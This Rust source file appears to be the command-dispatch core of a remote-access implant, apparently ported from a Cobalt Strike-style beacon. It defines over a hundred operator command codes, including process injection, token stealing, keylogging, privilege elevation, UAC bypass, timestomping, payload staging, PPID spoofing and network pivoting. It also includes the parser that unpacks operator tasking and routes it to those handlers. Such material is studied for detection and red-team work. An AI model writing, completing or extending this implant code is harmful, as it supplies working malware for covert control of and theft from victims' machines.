//! Command dispatch (proto.cpp).

use crate::callback::command_shell_callback;
use crate::commands::*;
use crate::jobs::{command_job_kill, command_job_register, command_jobs};
use crate::link::{
    command_link_reopen, command_link_route, command_link_start_explicit, command_link_stop,
};
use crate::link_tcp::command_tcp_connect;
use crate::pivot::{
    command_close, command_connect, command_listen, command_send, command_socket_bind,
    command_socket_close, command_socket_tcppivot,
};
use crate::tokens::{
    command_getuid, command_loginuser, command_rev2self, command_steal_token,
};
use crate::elevate::{command_elevate_post, command_elevate_pre, command_getprivs};
use crate::filesys::{
    command_file_copy, command_file_delete, command_file_drives, command_file_list,
    command_file_mkdir, command_file_move,
};
use crate::hotbeef::{
    command_inject, command_inject_pid, command_inject_pid_ping, command_inject_ping,
    command_job_spawn, command_spawnas, command_spawnu,
};
use crate::boff::command_inline_execute_object;
use crate::powershell::{command_psh_host_tcp, command_psh_import};
use crate::process::{command_blockdlls, command_ppid, command_spawnproc};
use crate::webserver::command_webserver_local;
use crate::argue::{command_argue_add, command_argue_list, command_argue_remove};
use crate::files::command_download;
use crate::files::command_download_stop;
use crate::ps::{command_ps_kill, command_ps_list};

pub const COMMAND_SPAWN: u32 = 0x01;
pub const COMMAND_SHELL: u32 = 0x02;
pub const COMMAND_DIE: u32 = 0x03;
pub const COMMAND_SLEEP: u32 = 0x04;
pub const COMMAND_CD: u32 = 0x05;
pub const COMMAND_KEYLOG_START: u32 = 0x06;
pub const COMMAND_KEYLOG_STOP: u32 = 0x07;
pub const COMMAND_KEYLOG_DUMP: u32 = 0x08;
pub const COMMAND_INJECT_PID: u32 = 0x09;
pub const COMMAND_UPLOAD: u32 = 0x0A;
pub const COMMAND_DOWNLOAD: u32 = 0x0B;
pub const COMMAND_EXECUTE: u32 = 0x0C;
pub const COMMAND_SPAWN_PROC_X86: u32 = 0x0D;
pub const COMMAND_CONNECT: u32 = 0x0E;
pub const COMMAND_SEND: u32 = 0x0F;
pub const COMMAND_CLOSE: u32 = 0x10;
pub const COMMAND_LISTEN: u32 = 0x11;
pub const COMMAND_INJECT_PING: u32 = 0x12;
pub const COMMAND_DOWNLOAD_STOP: u32 = 0x13;
pub const COMMAND_CHANNEL_SMB: u32 = 0x14;
pub const COMMAND_PIPE_OPEN: u32 = 0x15;
pub const COMMAND_PIPE_ROUTE: u32 = 0x16;
pub const COMMAND_PIPE_CLOSE: u32 = 0x17;
pub const COMMAND_PIPE_REOPEN: u32 = 0x18;
pub const COMMAND_GETSYSTEM: u32 = 0x19;
pub const COMMAND_BYPASSUAC: u32 = 0x1A;
pub const COMMAND_TOKEN_GETUID: u32 = 0x1B;
pub const COMMAND_TOKEN_REV2SELF: u32 = 0x1C;
pub const COMMAND_TIMESTOMP: u32 = 0x1D;
pub const COMMAND_DEPRECATE_D: u32 = 0x1E;
pub const COMMAND_STEAL_TOKEN: u32 = 0x1F;
pub const COMMAND_PS_LIST: u32 = 0x20;
pub const COMMAND_PS_KILL: u32 = 0x21;
pub const COMMAND_KERB_TKT_USE: u32 = 0x22;
pub const COMMAND_KERB_TKT_PURGE: u32 = 0x23;
pub const COMMAND_PSH_RUN: u32 = 0x24;
pub const COMMAND_PSH_IMPORT: u32 = 0x25;
pub const COMMAND_RUNAS: u32 = 0x26;
pub const COMMAND_PWD: u32 = 0x27;
pub const COMMAND_JOB_REGISTER: u32 = 0x28;
pub const COMMAND_JOBS: u32 = 0x29;
pub const COMMAND_JOB_KILL: u32 = 0x2a;
pub const COMMAND_INJECTX64_PID: u32 = 0x2b;
pub const COMMAND_SPAWNX64: u32 = 0x2c;
pub const COMMAND_INJECT_PID_PING: u32 = 0x2d;
pub const COMMAND_INJECTX64_PID_PING: u32 = 0x2e;
pub const COMMAND_PAUSE: u32 = 0x2f;
pub const COMMAND_IPCONFIG: u32 = 0x30;
pub const COMMAND_LOGINUSER: u32 = 0x31;
pub const COMMAND_LSOCKET_BIND: u32 = 0x32;
pub const COMMAND_LSOCKET_CLOSE: u32 = 0x33;
pub const COMMAND_STAGE_PAYLOAD: u32 = 0x34;
pub const COMMAND_FILE_LIST: u32 = 0x35;
pub const COMMAND_FILE_MKDIR: u32 = 0x36;
pub const COMMAND_FILE_DRIVES: u32 = 0x37;
pub const COMMAND_FILE_RM: u32 = 0x38;
pub const COMMAND_STAGE_PAYLOAD_SMB: u32 = 0x39;
pub const COMMAND_PSEXEC_COMMAND: u32 = 0x3a;
pub const COMMAND_WEBSERVER_LOCAL: u32 = 0x3b;
pub const COMMAND_ELEVATE_PRE: u32 = 0x3c;
pub const COMMAND_ELEVATE_POST: u32 = 0x3d;
pub const COMMAND_JOB_REGISTER_IMPERSONATE: u32 = 0x3e;
pub const COMMAND_SPAWN_POWERSHELLX86: u32 = 0x3f;
pub const COMMAND_SPAWN_POWERSHELLX64: u32 = 0x40;
pub const COMMAND_INJECT_POWERSHELLX86_PID: u32 = 0x41;
pub const COMMAND_INJECT_POWERSHELLX64_PID: u32 = 0x42;
pub const COMMAND_UPLOAD_CONTINUE: u32 = 0x43;
pub const COMMAND_PIPE_OPEN_EXPLICIT: u32 = 0x44;
pub const COMMAND_SPAWN_PROC_X64: u32 = 0x45;
pub const COMMAND_JOB_SPAWN_X86: u32 = 0x46;
pub const COMMAND_JOB_SPAWN_X64: u32 = 0x47;
pub const COMMAND_SETENV: u32 = 0x48;
pub const COMMAND_FILE_COPY: u32 = 0x49;
pub const COMMAND_FILE_MOVE: u32 = 0x4a;
pub const COMMAND_PPID: u32 = 0x4b;
pub const COMMAND_RUN_UNDER_PID: u32 = 0x4c;
pub const COMMAND_GETPRIVS: u32 = 0x4d;
pub const COMMAND_EXECUTE_JOB: u32 = 0x4e;
pub const COMMAND_PSH_HOST_TCP: u32 = 0x4f;
pub const COMMAND_DLL_LOAD: u32 = 0x50;
pub const COMMAND_REG_QUERY: u32 = 0x51;
pub const COMMAND_LSOCKET_TCPPIVOT: u32 = 0x52;
pub const COMMAND_ARGUE_ADD: u32 = 0x53;
pub const COMMAND_ARGUE_REMOVE: u32 = 0x54;
pub const COMMAND_ARGUE_LIST: u32 = 0x55;
pub const COMMAND_TCP_CONNECT: u32 = 0x56;
pub const COMMAND_JOB_SPAWN_TOKEN_X86: u32 = 0x57;
pub const COMMAND_JOB_SPAWN_TOKEN_X64: u32 = 0x58;
pub const COMMAND_SPAWN_TOKEN_X86: u32 = 0x59;
pub const COMMAND_SPAWN_TOKEN_X64: u32 = 0x5a;
pub const COMMAND_INJECTX64_PING: u32 = 0x5b;
pub const COMMAND_BLOCKDLLS: u32 = 0x5c;
pub const COMMAND_SPAWNAS_X86: u32 = 0x5d;
pub const COMMAND_SPAWNAS_X64: u32 = 0x5e;
pub const COMMAND_INLINE_EXECUTE: u32 = 0x5f;
pub const COMMAND_ELEVATE_RUN_INJ_X86: u32 = 0x60;
pub const COMMAND_ELEVATE_RUN_INJ_X64: u32 = 0x61;
pub const COMMAND_SPAWNU_X86: u32 = 0x62;
pub const COMMAND_SPAWNU_X64: u32 = 0x63;
pub const COMMAND_INLINE_EXECUTE_OBJECT: u32 = 0x64;
pub const COMMAND_JOB_REGISTER_MSGMODE: u32 = 0x65;
pub const COMMAND_LSOCKET_BIND_LOCALHOST: u32 = 0x66;

pub struct Header {
    pub rtype: u32,
    pub size: u32,
}

pub fn process_message(rtype: u32, buffer: &[u8], length: usize) {
    match rtype {
        COMMAND_SPAWN => command_inject(buffer, length, true, true),
        COMMAND_INJECT_PID => command_inject_pid(buffer, length, true),
        COMMAND_SHELL => {} // deprecated
        COMMAND_DIE => command_die(command_shell_callback),
        COMMAND_SLEEP => command_sleep(buffer, length),
        COMMAND_CD => command_cd(buffer, length),
        COMMAND_KEYLOG_START | COMMAND_KEYLOG_STOP => {} // deprecated
        COMMAND_UPLOAD => command_upload(buffer, length, b"wb"),
        COMMAND_DOWNLOAD => command_download(buffer, length, command_shell_callback),
        COMMAND_EXECUTE => command_execute(buffer, length),
        COMMAND_SPAWN_PROC_X86 => command_spawnproc(buffer, length, true),
        COMMAND_CONNECT => command_connect(buffer, length, command_shell_callback),
        COMMAND_SEND => command_send(buffer, length),
        COMMAND_CLOSE => command_close(buffer, length),
        COMMAND_LISTEN => command_listen(buffer, length, command_shell_callback),
        COMMAND_INJECT_PING => command_inject_ping(buffer, length, true, command_shell_callback),
        COMMAND_DOWNLOAD_STOP => command_download_stop(buffer, length),
        COMMAND_CHANNEL_SMB | COMMAND_PIPE_OPEN => {} // deprecated
        COMMAND_PIPE_ROUTE => command_link_route(buffer, length, command_shell_callback),
        COMMAND_PIPE_CLOSE => command_link_stop(buffer, length, command_shell_callback),
        COMMAND_PIPE_REOPEN => command_link_reopen(buffer, length, command_shell_callback),
        COMMAND_TOKEN_GETUID => command_getuid(buffer, length, command_shell_callback),
        COMMAND_TOKEN_REV2SELF => command_rev2self(),
        COMMAND_STEAL_TOKEN => command_steal_token(buffer, length, command_shell_callback),
        COMMAND_GETSYSTEM | COMMAND_BYPASSUAC | COMMAND_TIMESTOMP => {} // deprecated
        COMMAND_PS_LIST => command_ps_list(buffer, length, command_shell_callback),
        COMMAND_PS_KILL => command_ps_kill(buffer, length),
        COMMAND_KERB_TKT_USE | COMMAND_KERB_TKT_PURGE | COMMAND_PSH_RUN => {} // deprecated
        COMMAND_PSH_IMPORT => command_psh_import(buffer, length),
        COMMAND_RUNAS => command_runas(buffer, length, command_shell_callback),
        COMMAND_PWD => command_pwd(command_shell_callback),
        COMMAND_JOB_REGISTER => command_job_register(buffer, length, false, JOB_MODE_BYTE),
        COMMAND_JOBS => command_jobs(command_shell_callback),
        COMMAND_JOB_KILL => command_job_kill(buffer, length),
        COMMAND_INJECTX64_PID => command_inject_pid(buffer, length, false),
        COMMAND_SPAWNX64 => command_inject(buffer, length, false, true),
        COMMAND_INJECT_PID_PING => command_inject_pid_ping(buffer, length, command_shell_callback, true),
        COMMAND_INJECTX64_PID_PING => command_inject_pid_ping(buffer, length, command_shell_callback, false),
        COMMAND_PAUSE => command_pause(buffer, length),
        COMMAND_IPCONFIG => {} // deprecated 4.2
        COMMAND_LOGINUSER => command_loginuser(buffer, length, command_shell_callback),
        COMMAND_LSOCKET_BIND => command_socket_bind(buffer, length, 0), // INADDR_ANY
        COMMAND_LSOCKET_CLOSE => command_socket_close(buffer, length),
        COMMAND_STAGE_PAYLOAD => command_stage_payload(buffer, length),
        COMMAND_FILE_LIST => command_file_list(buffer, length, command_shell_callback),
        COMMAND_FILE_MKDIR => command_file_mkdir(buffer, length),
        COMMAND_FILE_DRIVES => command_file_drives(buffer, length, command_shell_callback),
        COMMAND_FILE_RM => command_file_delete(buffer, length),
        COMMAND_STAGE_PAYLOAD_SMB => command_stage_payload_smb(buffer, length),
        COMMAND_PSEXEC_COMMAND => {} // deprecated 4.1
        COMMAND_WEBSERVER_LOCAL => command_webserver_local(buffer, length),
        COMMAND_ELEVATE_PRE => command_elevate_pre(buffer, length),
        COMMAND_ELEVATE_POST => command_elevate_post(command_shell_callback),
        COMMAND_JOB_REGISTER_IMPERSONATE => command_job_register(buffer, length, true, JOB_MODE_BYTE),
        COMMAND_SPAWN_POWERSHELLX86 | COMMAND_SPAWN_POWERSHELLX64
        | COMMAND_INJECT_POWERSHELLX86_PID | COMMAND_INJECT_POWERSHELLX64_PID => {} // deprecated
        COMMAND_UPLOAD_CONTINUE => command_upload(buffer, length, b"ab"),
        COMMAND_PIPE_OPEN_EXPLICIT => command_link_start_explicit(buffer, length, command_shell_callback),
        COMMAND_SPAWN_PROC_X64 => command_spawnproc(buffer, length, false),
        COMMAND_JOB_SPAWN_X86 => command_job_spawn(buffer, length, true, true),
        COMMAND_JOB_SPAWN_X64 => command_job_spawn(buffer, length, false, true),
        COMMAND_SETENV => command_setenv(buffer, length),
        COMMAND_FILE_COPY => command_file_copy(buffer, length),
        COMMAND_FILE_MOVE => command_file_move(buffer, length),
        COMMAND_PPID => command_ppid(buffer, length),
        COMMAND_RUN_UNDER_PID => command_runu(buffer, length),
        COMMAND_GETPRIVS => command_getprivs(buffer, length, command_shell_callback),
        COMMAND_EXECUTE_JOB => command_execjob(buffer, length),
        COMMAND_PSH_HOST_TCP => command_psh_host_tcp(buffer, length),
        COMMAND_DLL_LOAD | COMMAND_REG_QUERY => {} // deprecated 4.1
        COMMAND_LSOCKET_TCPPIVOT => command_socket_tcppivot(buffer, length),
        COMMAND_ARGUE_ADD => command_argue_add(buffer, length),
        COMMAND_ARGUE_REMOVE => command_argue_remove(buffer, length),
        COMMAND_ARGUE_LIST => command_argue_list(command_shell_callback),
        COMMAND_TCP_CONNECT => command_tcp_connect(buffer, length, command_shell_callback),
        COMMAND_JOB_SPAWN_TOKEN_X86 => command_job_spawn(buffer, length, true, false),
        COMMAND_JOB_SPAWN_TOKEN_X64 => command_job_spawn(buffer, length, false, false),
        COMMAND_SPAWN_TOKEN_X86 => command_inject(buffer, length, true, false),
        COMMAND_SPAWN_TOKEN_X64 => command_inject(buffer, length, false, false),
        COMMAND_INJECTX64_PING => command_inject_ping(buffer, length, false, command_shell_callback),
        COMMAND_BLOCKDLLS => command_blockdlls(buffer, length),
        COMMAND_SPAWNAS_X86 => command_spawnas(buffer, length, true),
        COMMAND_SPAWNAS_X64 => command_spawnas(buffer, length, false),
        COMMAND_INLINE_EXECUTE | COMMAND_ELEVATE_RUN_INJ_X86 | COMMAND_ELEVATE_RUN_INJ_X64 => {} // deprecated
        COMMAND_SPAWNU_X86 => command_spawnu(buffer, length, true),
        COMMAND_SPAWNU_X64 => command_spawnu(buffer, length, false),
        COMMAND_INLINE_EXECUTE_OBJECT => command_inline_execute_object(buffer, length),
        COMMAND_JOB_REGISTER_MSGMODE => command_job_register(buffer, length, false, JOB_MODE_MESSAGE),
        COMMAND_LSOCKET_BIND_LOCALHOST => command_socket_bind(buffer, length, 0x0100007f),
        _ => {}
    }
}

/// Process through the buffer: extract the length, type, and value.
pub fn process_payload(buffer: &mut [u8], length: usize) {
    let mut pos = 0usize;
    while pos < length {
        if pos + 8 > length {
            return;
        }
        let rtype = u32::from_be_bytes([buffer[pos], buffer[pos + 1], buffer[pos + 2], buffer[pos + 3]]);
        let size = u32::from_be_bytes([buffer[pos + 4], buffer[pos + 5], buffer[pos + 6], buffer[pos + 7]]);

        // sanity check our data
        if (pos + size as usize + 8) > length {
            return;
        }

        // process our message
        process_message(rtype, &buffer[pos + 8..pos + 8 + size as usize], size as usize);

        // on to the next message please
        pos += size as usize + 8;
    }

    // cleanup the data we just processed
    buffer[..length].fill(0);
}
